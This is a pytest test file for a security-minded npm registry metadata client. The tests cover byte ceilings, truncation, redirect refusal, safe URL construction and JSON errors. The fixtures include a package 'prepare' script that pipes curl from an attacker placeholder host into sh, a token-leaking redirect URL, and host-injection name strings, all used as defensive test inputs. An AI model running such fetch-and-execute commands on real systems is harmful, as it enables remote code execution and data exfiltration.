"""The metadata client: one request, a bounded read, a validated model — or a named category.

Every test here drives the client through an injected transport, because the three behaviours
worth the most money are all about *bytes arriving*: the ceiling that stops a read part-way,
the truncation check that compares what arrived against what was declared, and the chunk loop
that decides how far past the ceiling a buffer can grow. Patching `json.loads` would leave all
three untested and green.

The stub therefore keeps the accounting visible. `read_sizes` proves `read(-1)` is never
called — a client that asked for the whole body at once could not enforce a limit while
reading it. `bytes_served` proves an abandoned stream really was abandoned early. `requests`
proves one reference means one request, which is what makes "package missing" and "version
missing" distinguishable without a second call, and what proves nothing here ever reaches for
a tarball.

An autouse fixture closes the socket family for the module, so "tests must not depend on live
npm availability" is enforced rather than intended: a test that accidentally used the real
transport fails with a named assertion instead of passing over the network and then failing
when a registry is slow.
"""

import base64
import email.message
import errno
import hashlib
import http.client
import inspect
import io
import json
import logging
import os
import socket
import urllib.error
import urllib.parse
import urllib.request
import urllib.response
from collections.abc import Callable
from pathlib import Path

import pytest

from packproof.config.settings import Settings
from packproof.registry import npm_fetcher
from packproof.registry.errors import (
    PackageNotFoundError,
    RegistryError,
    RegistryHTTPError,
    RegistryInvalidResponseError,
    RegistryMetadataError,
    RegistryNetworkError,
    RegistryNotJSONError,
    RegistryRedirectError,
    RegistryResponseTooLargeError,
    RegistryTimeoutError,
    UnexpectedDownloadOriginError,
    VersionNotFoundError,
)
from packproof.registry.npm import parse_npm_reference
from packproof.registry.npm_fetcher import (
    _METADATA_READ_CHUNK_BYTES,
    NPM_REGISTRY_HOST,
    NpmRegistryClient,
    _default_opener,
    _RefuseRedirectHandler,
    npm_package_url,
)
from packproof.schemas.models import PackageVersionMetadata

#: A ceiling with room for every fixture document below and none of a pathological one.
_CEILING = 1_000_000

#: A redirect target that must be refused, released and never repeated.
_REDIRECT_TARGET = "https://attacker.invalid/collect?token=leaked"


# --------------------------------------------------------------------------- the transport stub


class StubResponse:
    """The slice of `http.client.HTTPResponse` this client uses, with the bytekeeping visible.

    `body` is either one blob or a sequence of chunks. A sequence is what the size-limit tests
    need: a stream the client can be caught abandoning, rather than a buffer the stub has
    already handed over in full before the ceiling is consulted.
    """

    def __init__(
        self,
        *,
        status: int = 200,
        body: bytes | list[bytes] = b"",
        headers: dict[str, str] | None = None,
    ) -> None:
        self.status = status
        self.chunks = list(body) if isinstance(body, list) else ([body] if body else [])
        self._headers = {name.lower(): value for name, value in (headers or {}).items()}
        self._chunk_index = 0
        self._offset = 0
        self.read_sizes: list[int] = []
        self.bytes_served = 0
        self.closed = False

    def read(self, size: int = -1) -> bytes:
        self.read_sizes.append(size)
        if size == -1:
            # The real object would hand over the whole body here. Refusing loudly is the point:
            # a client that read this way would have buffered an unbounded response.
            raise AssertionError("the client read the whole body at once")
        taken = 0
        collected = bytearray()
        while taken < size and self._chunk_index < len(self.chunks):
            chunk = self.chunks[self._chunk_index]
            available = len(chunk) - self._offset
            want = min(size - taken, available)
            piece = chunk[self._offset : self._offset + want]
            collected += piece
            taken += len(piece)
            self.bytes_served += len(piece)
            self._offset += want
            if self._offset >= len(chunk):
                self._chunk_index += 1
                self._offset = 0
        return bytes(collected)

    def getheader(self, name: str, default: str | None = None) -> str | None:
        return self._headers.get(name.lower(), default)

    def close(self) -> None:
        self.closed = True


class _FailingStream(StubResponse):
    """A body that is a sequence of chunks and can stop being one partway through.

    An exception in the chunk list is raised when the reader reaches it, which is the only
    faithful way to test what happens *after* the transport handed over a response object:
    mid-body stalls, resets and truncations are invisible to a stub that only fails the call.
    """

    def read(self, size: int = -1) -> bytes:
        self.read_sizes.append(size)
        if self._chunk_index >= len(self.chunks):
            return b""
        chunk = self.chunks[self._chunk_index]
        self._chunk_index += 1
        if isinstance(chunk, BaseException):
            raise chunk
        self.bytes_served += len(chunk)
        return chunk


class CountingHandle(io.BytesIO):
    """A response handle that counts its own closes.

    A double close is invisible on a real file object and harmless, which is exactly why the
    test needs a counter: "closed once, not twice" is the property being asserted, and `BytesIO`
    cannot report it.
    """

    def __init__(self, data: bytes = b"") -> None:
        super().__init__(data)
        self.close_calls = 0

    def close(self) -> None:
        self.close_calls += 1
        super().close()


class UnreadableHandle(io.BytesIO):
    """A response handle that fails the test if anything reads it.

    `HTTPError` is a readable object, so "the body of an error response is never consumed" needs
    more than an absence-of-text assertion: a client that buffered it to find out would pass a
    `not in` check while still having read a megabyte of whoever-published-it prose.
    """

    def read(self, *args: object) -> bytes:
        raise AssertionError("the error response body was read")

    def readline(self, *args: object) -> bytes:
        raise AssertionError("the error response body was read")

    def readlines(self, *args: object) -> list[bytes]:
        raise AssertionError("the error response body was read")


class UncloseableHandle(io.BytesIO):
    """A handle that refuses its first `close()`, which is what a released descriptor does.

    `close()` on a socket the transport has already handed back raises `OSError(9)`. Cleaning up is
    not the diagnosis, so the status code still has to arrive — this turns "does a failing close
    swallow the error" from a reading question into an assertion.

    The refusal is one-shot and the count is exposed, for two reasons: the first close is the one
    PackProof performs, and `HTTPError`'s own finalizer closes the handle again at collection time,
    where a permanent refusal would surface as an unraisable exception in an unrelated test.
    """

    def __init__(self, data: bytes = b"") -> None:
        super().__init__(data)
        self.close_attempts = 0

    def close(self) -> None:
        self.close_attempts += 1
        if self.close_attempts == 1:
            raise OSError(9, "Bad file descriptor")
        super().close()


class RedirectHandle(UnreadableHandle):
    """Unreadable *and* self-counting, which is what the redirect path has to prove at once.

    `urllib`'s own cleanup for a redirect it decides to follow is `fp.read()` and then `fp.close()`.
    A fixture that only counted closes would therefore also credit a client that drained the body to
    get there, and draining is the thing this stage forbids.
    """

    def __init__(self, data: bytes = b"") -> None:
        super().__init__(data)
        self.close_attempts = 0

    def close(self) -> None:
        self.close_attempts += 1
        super().close()


class RedirectResponse:
    """The response object urllib's error machinery is handed after a 3xx answer.

    Only what that machinery reads: `code` and `msg` for the status line, `info()` for the headers,
    and a handle underneath with `close()` and `closed` delegating to it. That is exactly what
    `urllib.response.addinfourl` does, restated so the test behaves identically on every Python in
    this project's CI matrix — the real class has moved `status` between a plain attribute and a
    read-only property across versions. The companion test that hands the handler a real
    `addinfourl` is what proves the delegation on urllib's own class rather than on this one.
    """

    def __init__(
        self,
        handle: io.BytesIO,
        *,
        code: int,
        msg: str,
        headers: email.message.Message,
    ) -> None:
        self.fp = handle
        self.code = code
        self.status = code
        self.msg = msg
        self.headers = headers

    def info(self) -> email.message.Message:
        return self.headers

    def read(self, *args: object) -> bytes:
        return self.fp.read(*args)

    def close(self) -> None:
        self.fp.close()

    @property
    def closed(self) -> bool:
        return self.fp.closed


class StubOpener:
    """A transport that answers with what the test said, and remembers what it was asked."""

    def __init__(self, *outcomes: StubResponse | Exception) -> None:
        self._outcomes = list(outcomes)
        self.requests: list[tuple[urllib.request.Request, float]] = []
        self.responses: list[StubResponse] = []

    def __call__(self, request: urllib.request.Request, timeout_seconds: float) -> StubResponse:
        self.requests.append((request, timeout_seconds))
        outcome = self._outcomes.pop(0) if len(self._outcomes) > 1 else self._outcomes[0]
        if isinstance(outcome, Exception):
            raise outcome
        self.responses.append(outcome)
        return outcome

    @property
    def urls(self) -> list[str]:
        return [request.full_url for request, _ in self.requests]


def _request(url: str) -> urllib.request.Request:
    """A `Request` object for the redirect machinery. Nothing is opened: the object is handed to
    urllib's own `http_error_302`, which only ever reads `full_url` off it."""
    return urllib.request.Request(url, method="GET")  # noqa: S310  (no URL is fetched here)


def message_is_ascii_and_short(message: str) -> bool:
    """A refusal has to be displayable and readable: ASCII for any terminal, short enough to
    quote in a log line without turning the diagnosis into a second payload."""
    return message.isascii() and len(message) < 1_000


def _raw_response(body: bytes, **headers: str) -> StubResponse:
    """A body sent exactly as written, declared at its own length."""
    declared = {"Content-Length": str(len(body)), "Content-Type": "application/json"}
    declared.update({name.replace("_", "-"): value for name, value in headers.items()})
    return StubResponse(body=body, headers=declared)


def _document_bytes(document: object) -> bytes:
    return json.dumps(document).encode("utf-8")


def _response(
    document: object, *, status: int = 200, headers: dict[str, str] | None = None
) -> StubResponse:
    """A response for `document`, declared at its exact length as a real registry would."""
    body = _document_bytes(document)
    declared = {"Content-Length": str(len(body)), "Content-Type": "application/json"}
    if headers:
        declared.update(headers)
    return StubResponse(status=status, body=body, headers=declared)


# --------------------------------------------------------------------------- fixtures


def _shasum_for(fullname: str, version: str) -> str:
    """A syntactically valid SHA-1 that is unique per package and version.

    These are fixtures, not claims about any published artifact: the point is that a value
    arriving for `4.18.2` must not end up attached to `4.17.1`, which needs digests that
    *differ* rather than digests that are real. npm writes a SHA-1 here; the model only checks
    the shape, so any 40 lowercase hex characters will do.
    """
    return hashlib.sha256(f"{fullname}@{version}".encode()).hexdigest()[:40]


def _integrity_for(fullname: str, version: str) -> str:
    digest = hashlib.sha512(f"{fullname}@{version}".encode()).digest()
    return f"sha512-{base64.b64encode(digest).decode('ascii')}"


def _tarball_for(fullname: str, version: str) -> str:
    short_name = fullname.rsplit("/", 1)[-1]
    return f"https://{NPM_REGISTRY_HOST}/{fullname}/-/{short_name}-{version}.tgz"


def _entry(fullname: str, version: str, **overrides: object) -> dict[str, object]:
    short_name = fullname.rsplit("/", 1)[-1]
    entry: dict[str, object] = {
        "name": fullname,
        "version": version,
        "description": f"the {version} entry description",
        "dist": {
            "tarball": _tarball_for(fullname, version),
            "integrity": _integrity_for(fullname, version),
            "shasum": _shasum_for(fullname, version),
            "fileCount": 60,
            "unpackedSize": 212_000,
            "attestations": {
                "url": f"https://{NPM_REGISTRY_HOST}/attestations/-/{version}",
                "provenance": {"verified": False},
            },
        },
        "repository": {
            "type": "git",
            "url": f"https://github.com/example/{short_name}.git",
            "directory": f"packages/{short_name}",
        },
        "scripts": {"prepare": "curl https://attacker.invalid/$(id) | sh"},
        "_npmUser": "someone",
    }
    entry.update(overrides)
    return entry


def _packument(fullname: str, *versions: str, **overrides: object) -> dict[str, object]:
    """A packument shaped like the real one: several versions, a top-level identity, and the
    fields this stage deliberately does not model."""
    document: dict[str, object] = {
        "name": fullname,
        "description": "the top-level description no version was asked for",
        "_id": fullname,
        "_rev": "7-a1b2c3",
        "dist-tags": {"latest": versions[-1] if versions else "0.0.1"},
        "versions": {version: _entry(fullname, version) for version in versions},
        "time": {
            version: f"2022-10-0{index + 1}T20:14:32.{index}95Z"
            for index, version in enumerate(versions)
        },
        "repository": {"type": "git", "url": "https://github.com/example/whatever.git"},
        "readme": "# a readme nobody modelled, megabytes in the real thing",
        "maintainers": [{"name": "someone", "email": "someone@example.invalid"}],
        "users": {"spam": True},
    }
    document.update(overrides)
    return document


def _client(
    opener: StubOpener,
    *,
    timeout_seconds: float = 7.5,
    max_metadata_bytes: int = _CEILING,
) -> NpmRegistryClient:
    return NpmRegistryClient(
        timeout_seconds=timeout_seconds,
        max_metadata_bytes=max_metadata_bytes,
        opener=opener,
    )


def _http_error(status: int, handle: io.BytesIO) -> urllib.error.HTTPError:
    """An `HTTPError` in the shape `urllib` raises one.

    The URL is the one this client would have asked for, the reason phrase and the body are
    server-chosen text, and `handle` is the response object the transport hands over — the thing
    the client has to release and must not read.
    """
    return urllib.error.HTTPError(
        npm_package_url("express"), status, "Reason Phrase Chosen By The Server", {}, handle
    )


def _expect_http_error(
    status: int, handle: io.BytesIO, reference: str = "express@4.18.2"
) -> tuple[RegistryError, urllib.error.HTTPError]:
    """Fetch `reference` against a raised `HTTPError` and return both errors.

    Both, because the properties under test belong to the object `urllib` raised — which handle it
    was carrying, what it was chained onto — and a helper that dropped it would make every test
    rebuild it by hand.
    """
    error = _http_error(status, handle)
    with pytest.raises(RegistryError) as excinfo:
        _client(StubOpener(error)).fetch_version_metadata(parse_npm_reference(reference))
    return excinfo.value, error


def _redirect_transport(
    status: int, handle: io.BytesIO, location: str | None
) -> tuple[Callable[..., object], list[str]]:
    """A replacement for urllib's socket layer that answers `status` and remembers being asked.

    `AbstractHTTPHandler.do_open` is the one function in the chain that connects, so substituting it
    leaves every other piece running unmodified: the opener `build_opener` assembles, this module's
    redirect-refusal handler installed in it, urllib's own `HTTPErrorProcessor`, urllib's own
    `http_error_302` and the `redirect_request` override this client writes.

    The list of URLs asked for is the evidence that no redirect was followed: one entry means one
    connection, and a handler that had decided to obey a `Location` header would have asked for a
    second one through this same function.
    """
    requests_made: list[str] = []

    def do_open(
        self: object, http_class: object, request: urllib.request.Request, **kwargs: object
    ) -> RedirectResponse:
        requests_made.append(request.full_url)
        headers = email.message.Message()
        if location is not None:
            headers["Location"] = location
        return RedirectResponse(handle, code=status, msg="Moved Temporarily", headers=headers)

    return do_open, requests_made


def _fetch_through_production_opener(
    monkeypatch: pytest.MonkeyPatch,
    status: int,
    handle: io.BytesIO,
    location: str | None = _REDIRECT_TARGET,
    reference: str = "express@4.18.2",
) -> tuple[RegistryError, list[str]]:
    """Fetch `reference` while urllib's own opener answers `status` with a redirect.

    Nothing is called by hand here. The client gets no injected transport, so it builds the real
    opener `_default_opener()` assembles, and the single substitution is `do_open` — the function
    that would have connected. Everything above it runs as production: `OpenerDirector.open`,
    `HTTPSHandler.https_open`, `HTTPErrorProcessor.http_response`, urllib's `http_error_302` and
    the `redirect_request` this module overrides. Whether the refused redirect's handle ends up
    closed is therefore urllib's own path deciding, not a test arranging one.

    The exception's base class is `RegistryError` rather than `RegistryRedirectError` because the
    no-`Location` variant of this call leaves urllib and comes back as an `HTTPError` instead; the
    caller asserts the specific class, which is the point of each test.
    """
    do_open, requests_made = _redirect_transport(status, handle, location)
    monkeypatch.setattr(urllib.request.AbstractHTTPHandler, "do_open", do_open)
    client = NpmRegistryClient(timeout_seconds=7.5, max_metadata_bytes=_CEILING)

    with pytest.raises(RegistryError) as excinfo:
        client.fetch_version_metadata(parse_npm_reference(reference))
    return excinfo.value, requests_made


def _fetch(
    document: object,
    reference: str = "express@4.18.2",
    *,
    timeout_seconds: float = 7.5,
    max_metadata_bytes: int = _CEILING,
):
    """One fetch of `document` for `reference`, through a fresh single-use transport."""
    opener = StubOpener(_response(document))
    client = _client(opener, timeout_seconds=timeout_seconds, max_metadata_bytes=max_metadata_bytes)
    return client.fetch_version_metadata(parse_npm_reference(reference)), opener


def _fetch_body(
    body: bytes,
    *,
    headers: dict[str, str] | None = None,
    declare: bool = True,
    timeout_seconds: float = 7.5,
    max_metadata_bytes: int = _CEILING,
    reference: str = "express@4.18.2",
) -> PackageVersionMetadata:
    """Send `body` verbatim as the response and return whatever the client makes of it.

    `declare=False` drops `Content-Length` entirely, which is the spelling a chunked or
    HTTP/2 response uses and the case where the read counter is the only limit left.
    """
    response_headers = {"Content-Type": "application/json"}
    if declare:
        response_headers["Content-Length"] = str(len(body))
    if headers is not None:
        response_headers.update(headers)
    response = StubResponse(body=body, headers=response_headers)
    client = _client(
        StubOpener(response), timeout_seconds=timeout_seconds, max_metadata_bytes=max_metadata_bytes
    )
    return client.fetch_version_metadata(parse_npm_reference(reference))


@pytest.fixture(autouse=True)
def _no_live_network(monkeypatch: pytest.MonkeyPatch) -> None:
    """Fail any test in this file that reaches the network, live npm or not."""

    def refuse(*args: object, **kwargs: object) -> None:
        raise AssertionError("a unit test tried to open a network connection")

    monkeypatch.setattr(socket, "socket", refuse)
    monkeypatch.setattr(socket, "create_connection", refuse)
    monkeypatch.setattr(socket, "getaddrinfo", refuse)


# --------------------------------------------------------------------------- URL construction


def test_an_unscoped_name_is_fetched_as_one_path_segment_on_the_registry_host() -> None:
    assert npm_package_url("express") == f"https://{NPM_REGISTRY_HOST}/express"


def test_a_scoped_name_has_its_slash_encoded_so_it_stays_one_segment() -> None:
    """`/@babel/core` is two segments and a different resource; `@babel%2Fcore` is the name.
    npm's HTTP API documents the encoded spelling, and the sigil is left readable because it
    carries no routing meaning."""
    assert npm_package_url("@babel/core") == f"https://{NPM_REGISTRY_HOST}/@babel%2Fcore"


def test_the_client_asks_the_registry_for_the_encoded_scoped_url() -> None:
    _, opener = _fetch(_packument("@babel/core", "7.24.0"), "@babel/core@7.24.0")

    assert opener.urls == [f"https://{NPM_REGISTRY_HOST}/@babel%2Fcore"]


@pytest.mark.parametrize(
    "name",
    [
        "express",
        "@babel/core",
        "@scope/.hidden",
        "a?x=1",
        "a#fragment",
        "a/../b",
        "a//b",
        "a@b",
        "evil.invalid/",
        "//evil.invalid/",
        "a\nnewline",
        "a éaccent",
        "\u0430\u0435\u0438\u043e\u0443",
    ],
)
def test_no_name_can_move_the_request_off_the_registry_host_or_add_a_query(name: str) -> None:
    """`npm_package_url` takes the *string* form of a name, and the only caller passes a
    validated one. This does not rely on that: scheme, host and path are assembled by
    `urlunsplit` from separate components, so a `?`, `#`, `//` or `@` inside the name cannot
    reappear as a query, a fragment, an authority or a different host. Non-ASCII is
    percent-encoded, which is the only spelling a URL has for it."""
    parts = urllib.parse.urlsplit(npm_package_url(name))
    path = urllib.parse.unquote(parts.path)

    assert parts.scheme == "https"
    assert parts.netloc == NPM_REGISTRY_HOST
    assert parts.query == ""
    assert parts.fragment == ""
    assert path == f"/{name}"


def test_the_version_is_never_part_of_the_request_url() -> None:
    """One request per package: the version is selected out of the document, which is what
    lets a missing package and a missing version be told apart without a second call — and
    keeps a `+` in build metadata away from the query-encoding trap `PackageRef` warns about."""
    _, opener = _fetch(_packument("express", "1.0.0+build.5"), "express@1.0.0+build.5")

    assert opener.urls == [f"https://{NPM_REGISTRY_HOST}/express"]


def test_the_request_is_a_get_json_identity_request_with_a_naming_user_agent() -> None:
    _, opener = _fetch(_packument("express", "4.18.2"))
    request, timeout_seconds = opener.requests[0]

    assert request.get_method() == "GET"
    assert request.data is None
    assert timeout_seconds == 7.5
    assert request.get_header("Accept") == "application/json"
    assert request.get_header("Accept-encoding") == "identity"
    assert request.get_header("User-agent").startswith("packproof/")


def test_the_request_carries_no_cookie_authorization_or_token() -> None:
    """Nothing here is authenticated, so nothing here can leak a credential. Asserted rather
    than assumed, because a later stage that adds a token would add it to this header dict."""
    _, opener = _fetch(_packument("express", "4.18.2"))
    request = opener.requests[0][0]

    names = {name.lower() for name, _ in request.header_items()}

    assert names == {"accept", "accept-encoding", "user-agent"}
    assert not any(name in names for name in ("cookie", "authorization", "x-auth-token"))


# --------------------------------------------------------------------------- the happy paths


def test_a_successful_unscoped_fetch_returns_a_validated_model_not_a_dictionary() -> None:
    document = _packument("express", "4.18.2")
    metadata, _ = _fetch(document)

    assert metadata.reference.fullname == "express"
    assert metadata.reference.version == "4.18.2"
    assert metadata.distribution.tarball_url == _tarball_for("express", "4.18.2")
    assert metadata.distribution.integrity == _integrity_for("express", "4.18.2")
    assert metadata.distribution.shasum == _shasum_for("express", "4.18.2")
    assert metadata.description == "the 4.18.2 entry description"
    assert metadata.repository is not None
    assert metadata.repository.url == "https://github.com/example/express.git"
    assert metadata.published_at is not None
    assert metadata.published_at.year == 2022


def test_a_successful_scoped_fetch_returns_the_same_shape() -> None:
    metadata, opener = _fetch(_packument("@babel/core", "7.24.0"), "@babel/core@7.24.0")

    assert metadata.reference.scope == "babel"
    assert metadata.reference.name == "core"
    assert metadata.distribution.tarball_url == _tarball_for("@babel/core", "7.24.0")
    assert len(opener.requests) == 1


def test_the_requested_version_is_selected_and_its_neighbours_stay_put() -> None:
    """Three published versions, one asked for. The decoys each carry their *own* tarball,
    integrity, shasum, description and timestamp, so a client that grabbed the first entry,
    the last entry or `dist-tags.latest` fails here instead of attaching someone else's
    digests to the artifact under analysis."""
    document = _packument("express", "4.17.1", "4.18.2", "5.0.0-rc.1")
    metadata, _ = _fetch(document, "express@4.18.2")

    assert metadata.distribution.integrity == _integrity_for("express", "4.18.2")
    assert metadata.distribution.shasum == _shasum_for("express", "4.18.2")
    assert metadata.description == "the 4.18.2 entry description"
    assert metadata.published_at is not None
    assert metadata.published_at.day == 2


def test_the_prerelease_of_a_package_is_a_record_of_its_own() -> None:
    metadata, _ = _fetch(_packument("express", "4.18.2", "5.0.0-rc.1"), "express@5.0.0-rc.1")

    assert metadata.reference.version == "5.0.0-rc.1"
    assert metadata.distribution.shasum == _shasum_for("express", "5.0.0-rc.1")


def test_the_entry_description_wins_over_the_documents_top_level_one() -> None:
    """`description` at the top of a packument belongs to the most recent publish. Reporting it
    for an older version would be PackProof choosing an answer the registry did not give to
    that question, so the top-level field is not consulted at all."""
    metadata, _ = _fetch(_packument("express", "4.18.2"))

    assert metadata.description != "the top-level description no version was asked for"


def test_a_version_without_its_own_repository_is_reported_as_absent_not_borrowed() -> None:
    """The top-level `repository` describes the current tree, not the release being analyzed —
    a monorepo moves packages between directories. Borrowing it would state a provenance claim
    the registry never made about this version."""
    document = _packument("express", "4.18.2")
    entry = _entry("express", "4.18.2")
    del entry["repository"]
    document["versions"]["4.18.2"] = entry

    metadata, _ = _fetch(document)

    assert metadata.repository is None
    assert metadata.distribution.tarball_url == _tarball_for("express", "4.18.2")


def test_a_repository_shorthand_is_kept_as_written_and_never_expanded() -> None:
    """`"gh:user/repo"` is the registry's claim in the registry's words. Turning it into
    `https://github.com/user/repo` would put a host PackProof chose into the evidence a later
    stage is supposed to be checking."""
    document = _packument("express", "4.18.2")
    document["versions"]["4.18.2"]["repository"] = "user/repo"

    metadata, _ = _fetch(document)

    assert metadata.repository is not None
    assert metadata.repository.url == "user/repo"
    assert metadata.repository.kind is None


def test_a_pre_sri_release_is_described_by_shasum_alone() -> None:
    """`vue` 0.8.6 predates npm writing SRI hashes; in 1,288 measured entries it is the one
    without `integrity`. Absent has to stay absent — refusing the lookup would say the package
    has no such version, which is a different and false thing."""
    document = _packument("express", "4.18.2")
    del document["versions"]["4.18.2"]["dist"]["integrity"]

    metadata, _ = _fetch(document)

    assert metadata.distribution.integrity is None
    assert metadata.distribution.shasum == _shasum_for("express", "4.18.2")


def test_a_version_entry_without_description_or_publish_time_is_not_a_failure() -> None:
    document = _packument("express", "4.18.2")
    del document["versions"]["4.18.2"]["description"]
    document["time"] = {"created": "2010-01-01T00:00:00.000Z"}

    metadata, _ = _fetch(document)

    assert metadata.description is None
    assert metadata.published_at is None


def test_unmodelled_registry_fields_are_not_carried_into_the_record() -> None:
    """`readme`, `maintainers`, `users`, `_rev`, `scripts`, `fileCount`, `attestations` — all
    present in the fixture, none in the model. A report line written from this record can only
    say what PackProof decided to read, and whoever published the package does not get to add
    fields to it."""
    metadata, _ = _fetch(_packument("express", "4.18.2"))
    dumped = metadata.model_dump()

    assert set(dumped) == {
        "reference",
        "distribution",
        "description",
        "repository",
        "published_at",
    }
    assert set(dumped["distribution"]) == {"tarball_url", "integrity", "shasum"}
    assert "readme" not in str(dumped)
    assert "megabytes" not in str(dumped)


# --------------------------------------------------------------------------- size limits


def test_a_declared_size_above_the_ceiling_is_refused_before_a_single_byte_is_read() -> None:
    """The brief's requirement is a limit enforced *before* the whole response is in memory,
    and this is the strongest form of it available: the body never starts. `read_sizes` is
    empty, so nothing was buffered, and the refusal is about the number the registry wrote."""
    document = _packument("express", "4.18.2")
    response = _response(document)
    opener = StubOpener(response)
    ceiling = len(response.chunks[0]) - 1

    with pytest.raises(RegistryResponseTooLargeError) as excinfo:
        _client(opener, max_metadata_bytes=ceiling).fetch_version_metadata(
            parse_npm_reference("express@4.18.2")
        )

    assert response.read_sizes == []
    assert response.bytes_served == 0
    message = str(excinfo.value)
    assert f"declared {len(response.chunks[0])} bytes" in message
    assert f"the {ceiling} byte ceiling" in message
    assert message.isascii()


@pytest.mark.parametrize("declared", [True, False])
def test_a_body_exactly_at_the_ceiling_is_read_and_parsed(declared: bool) -> None:
    """The boundary, on the accepted side, with and without a `Content-Length`. `>` not `>=` is
    what makes a ceiling of N mean N usable bytes; a one-byte mistake here silently shrinks
    every configured limit and cuts off real packages."""
    body = _document_bytes(_packument("express", "4.18.2")) + b" "

    metadata = _fetch_body(body, declare=declared, max_metadata_bytes=len(body))

    assert metadata.reference.version == "4.18.2"


@pytest.mark.parametrize("declared", [True, False])
def test_one_byte_past_the_ceiling_is_refused(declared: bool) -> None:
    """The same boundary from the other side, and both routes are the same category: a declared
    size is refused before the read starts, an undeclared one is refused by the counter while it
    runs. Neither one lets a 1,174-byte body through a 1,173-byte ceiling."""
    body = _document_bytes(_packument("express", "4.18.2"))

    with pytest.raises(RegistryResponseTooLargeError):
        _fetch_body(body, declare=declared, max_metadata_bytes=len(body) - 1)


def test_a_response_with_no_declared_length_is_still_bounded_by_the_counter() -> None:
    """No `Content-Length` removes the pre-flight check and nothing else. The chunk loop is the
    limit; a header is an optimisation."""
    document = _packument("express", "4.18.2")
    body = _document_bytes(document)
    response = StubResponse(body=body, headers={"Content-Type": "application/json"})

    with pytest.raises(RegistryResponseTooLargeError):
        _client(StubOpener(response), max_metadata_bytes=len(body) - 1).fetch_version_metadata(
            parse_npm_reference("express@4.18.2")
        )


def test_an_oversized_stream_is_abandoned_within_one_chunk_of_the_ceiling() -> None:
    """A registry that keeps sending has to be stopped while it sends. The buffer peaks at the
    ceiling plus the chunk size — that overshoot is `_METADATA_READ_CHUNK_BYTES`, and this test
    is what keeps it from silently becoming "read the whole thing, then check"."""
    chunks = [b"a" * _METADATA_READ_CHUNK_BYTES] * 40
    ceiling = 100_000
    response = StubResponse(body=chunks, headers={"Content-Length": "2621440"})

    with pytest.raises(RegistryResponseTooLargeError):
        _client(StubOpener(response), max_metadata_bytes=ceiling).fetch_version_metadata(
            parse_npm_reference("express@4.18.2")
        )

    assert response.bytes_served <= ceiling + _METADATA_READ_CHUNK_BYTES
    assert response.bytes_served < sum(len(chunk) for chunk in chunks)


def test_the_body_is_never_asked_for_in_one_go() -> None:
    """`read(-1)` would hand the whole response to memory before any limit could be applied.
    The stub raises if it is ever called; this asserts the call pattern that did happen."""
    _, opener = _fetch(_packument("express", "4.18.2"))

    assert set(opener.responses[0].read_sizes) == {_METADATA_READ_CHUNK_BYTES}


def test_a_response_that_ends_early_is_refused_as_truncated() -> None:
    """A body shorter than its own `Content-Length` is not a small document: it is a JSON
    object that stops mid-field, and the parse error it produces would describe the *truncation*
    while the real fact is that the transport gave up."""
    document = _packument("express", "4.18.2")
    body = _document_bytes(document)
    response = StubResponse(
        body=body[: len(body) // 2],
        headers={"Content-Length": str(len(body))},
    )

    with pytest.raises(RegistryInvalidResponseError) as excinfo:
        _client(StubOpener(response)).fetch_version_metadata(parse_npm_reference("express@4.18.2"))

    assert f"after {len(body) // 2} of the {len(body)} bytes it declared" in str(excinfo.value)


def test_a_response_that_declares_nothing_and_delivers_nothing_is_not_truncation() -> None:
    """An empty body with no header is a *content* problem, and it has to reach the JSON layer
    to be called what it is."""
    response = StubResponse(body=b"", headers={})

    with pytest.raises(RegistryNotJSONError):
        _client(StubOpener(response)).fetch_version_metadata(parse_npm_reference("express@4.18.2"))


@pytest.mark.parametrize(
    "declared",
    [
        None,
        "",
        "   ",
        "not-a-number",
        "-1",
        "100, 100",
        "0x400",
        "1e6",
        "١٢٣",
        "999999999999999999999999",
        "  12  ",
    ],
)
def test_a_content_length_in_any_spelling_cannot_let_an_oversized_body_through(
    declared: str,
) -> None:
    """`Content-Length` is used twice and believed zero times. A header in any other spelling
    yields no pre-flight number, and the ceiling is then enforced by the read counter alone —
    which is the check that was always load-bearing."""
    document = _packument("express", "4.18.2")
    body = _document_bytes(document)
    headers = {"Content-Type": "application/json"}
    if declared is not None:
        headers["Content-Length"] = declared
    response = StubResponse(body=body, headers=headers)

    with pytest.raises(RegistryResponseTooLargeError):
        _client(StubOpener(response), max_metadata_bytes=len(body) - 1).fetch_version_metadata(
            parse_npm_reference("express@4.18.2")
        )


def test_a_declared_length_that_is_a_number_is_honoured_for_the_pre_flight_check() -> None:
    """The other side of the same rule: a well-formed header is used to refuse *earlier*, not to
    trust the size — the same body under a garbage header is refused by the counter instead."""
    document = _packument("express", "4.18.2")
    declared = 50_000_000_000
    response = StubResponse(
        body=_document_bytes(document), headers={"Content-Length": str(declared)}
    )

    with pytest.raises(RegistryResponseTooLargeError, match="declared 50000000000 bytes") as e:
        _client(StubOpener(response)).fetch_version_metadata(parse_npm_reference("express@4.18.2"))

    assert response.read_sizes == []
    assert str(e.value).isascii()


@pytest.mark.parametrize("encoding", ["gzip", "GZIP ", " br", "deflate", "zstd", "identity, gzip"])
def test_a_compressed_body_is_refused_instead_of_being_inflated(encoding: str) -> None:
    """The request asks for `identity`. A body that arrives encoded anyway would make the byte
    ceiling count compressed bytes while the parser received far more — a 100 KB gzip of JSON is
    megabytes, and the limit would have measured the wrong thing."""
    response = StubResponse(body=b"x" * 10, headers={"Content-Encoding": encoding})

    with pytest.raises(RegistryInvalidResponseError) as excinfo:
        _client(StubOpener(response)).fetch_version_metadata(parse_npm_reference("express@4.18.2"))

    assert "which PackProof does not decode" in str(excinfo.value)
    assert response.read_sizes == []


@pytest.mark.parametrize("encoding", [None, "", "identity", " IDENTITY "])
def test_an_uncompressed_or_absent_content_encoding_is_accepted(encoding: str | None) -> None:
    document = _packument("express", "4.18.2")
    headers = {"Content-Type": "application/json"}
    if encoding is not None:
        headers["Content-Encoding"] = encoding
    response = StubResponse(body=_document_bytes(document), headers=headers)

    metadata = _client(StubOpener(response)).fetch_version_metadata(
        parse_npm_reference("express@4.18.2")
    )

    assert metadata.reference.version == "4.18.2"


# --------------------------------------------------------------------------- JSON shape


def test_a_body_that_is_not_json_is_refused_without_quoting_it() -> None:
    """An error page, a proxy's login form, a truncated upload — all arrive here as text that
    will not parse. The refusal says how many bytes were read and which parse error happened;
    it does not reproduce the body, because the body is whoever answered's content."""
    body = b"<html><body>502 Bad Gateway \xc3\xa9</body></html>"

    with pytest.raises(RegistryNotJSONError) as excinfo:
        _fetch_body(body)

    message = str(excinfo.value)
    assert "the body is not included" in message
    assert "502 Bad Gateway" not in message
    assert message.isascii()


def test_invalid_utf8_in_a_body_is_a_json_refusal_not_a_crash() -> None:
    """The bytes are decoded inside the parse, so the `UnicodeDecodeError` has to land in the
